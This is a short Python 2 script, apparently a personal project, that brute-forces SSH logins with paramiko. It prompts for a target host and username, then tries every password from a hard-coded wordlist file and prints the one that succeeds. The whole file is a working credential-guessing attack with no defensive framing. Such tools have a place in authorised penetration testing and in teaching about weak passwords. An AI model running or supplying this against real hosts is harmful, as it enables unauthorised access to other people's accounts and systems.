import paramiko, sys, os, socket
global host,username,line,input_file

paramiko.util.log_to_file("filename.log")

line = "\n..................................................\n"

def ssh_connect(password, code = 0):
	print "ssh_connect"
	ssh = paramiko.client.SSHClient()# before was: paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password,allow_agent=False, look_for_keys=False)
	except paramiko.AuthenticationException:
		#[*] Authentication failed ...
		code = 1
	except socket.error, e:
		#[*] Connection Failed ... Host Down"
		code = 2

	ssh.close()
	return code

try:
	host = raw_input("[*]Enter Target Host Address: ")
	username = raw_input("[*] Enter SSH Username: ")
	input_file =  "/home/nico/Projects/pass.txt"
	#raw_input("[*] Enter SSH Password File: ")
	if os.path.exists(input_file) == False:
		print "\n[*] File Path Does Not Exist !!!"
		sys.exit(4)
except KeyboardInterrupt:
	print "\n\n[*] User request An Interrupt"
	sys.exit(3)

input_file = open(input_file)

for i in input_file.readlines():
	password = i.strip("\n")
	try:
		response = ssh_connect(password)
		if response == 0:
			print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
			sys.exit(0)
		elif response == 1:
			print("[*] User: %s [*] Pass: %s => Login Incorrect !! <=" % (username, password))
		elif response == 2:
			print("[*] Connection Could Not BeEestablished to address: %s" % (host))
			sys.exit(2)
	except Exception, e:
		print e
		pass

input_file.close()
